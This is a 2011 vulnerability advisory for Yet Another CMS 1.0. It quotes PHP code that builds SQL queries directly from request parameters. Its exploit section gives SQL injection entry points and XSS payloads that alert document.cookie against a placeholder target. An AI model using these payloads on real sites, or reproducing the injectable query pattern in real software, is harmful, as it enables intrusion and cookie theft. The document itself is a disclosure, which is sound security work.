Advisory ID:            SSCHADV2011-031
Author:                 Stefan Schurtz
Affected Software:      Successfully tested on Yet Another CMS 1.0
Vendor URL:             http://yetanothercms.codeplex.com/
Vendor Status:          informed
 
==========================
Vulnerability Description:
==========================
 
Yet Another CMS 1.0 is prone to multiple SQL Injection and XSS vulnerabilities
 
==================
Technical Details:
==================
 
// search.php
$result_set = get_search_result_set($_POST[&#039;pattern&#039;]);
 
// includes/functions.php
function get_search_result_set($pattern, $public = true) {
      global $connection;
      $query = "SELECT
                   id,
                   subject_id,
                   menu_name,
                   position,
                   visible,
                   content,
                   CONCAT(&#039;... &#039;, SUBSTRING(content, LOCATE(&#039;" . $pattern . "&#039;,content), 200), &#039; ...&#039;) as fragment
                FROM
                   pages
                WHERE
                   content like &#039;%" . $pattern . "%&#039;";
 
// index.php
<?php find_selected_page(); ?>
 
// includes/functions.php
function find_selected_page() {
                global $sel_subject;
                global $sel_page;
                if (isset($_GET[&#039;subj&#039;])) {
                        $sel_subject = get_subject_by_id($_GET[&#039;subj&#039;]);
                        $sel_page = get_default_page($sel_subject[&#039;id&#039;]);
                } elseif (isset($_GET[&#039;page&#039;])) {
                        $sel_subject = NULL;
                        $sel_page = get_page_by_id($_GET[&#039;page&#039;]);
                } else {
                        $sel_subject = NULL;
                        $sel_page = NULL;
                }
}
 
 
function get_page_by_id($page_id) {
                global $connection;
                $query = "SELECT * ";
                $query .= "FROM pages ";
                $query .= "WHERE id=" . $page_id ." ";
                $query .= "LIMIT 1";
 
==================
Exploit
==================
 
SQL Injection
 
http://<target>/index.php?page=[sql injection]
http://<target>/search.php -> &#039;search field&#039; -> [sql injection]
 
XSS
 
http://<target>/search.php -> &#039;search field&#039; -> &#039;"</script><script>alert(document.cookie)</script>
http://<target>/index.php?page=&#039;</script><script>alert(document.cookie)</script>
 
====================
Disclosure Timeline:
====================
 
18-Oct-2011 - informed developers
 
========
Credits:
========
 
Vulnerabilities found and advisory written by Stefan Schurtz.



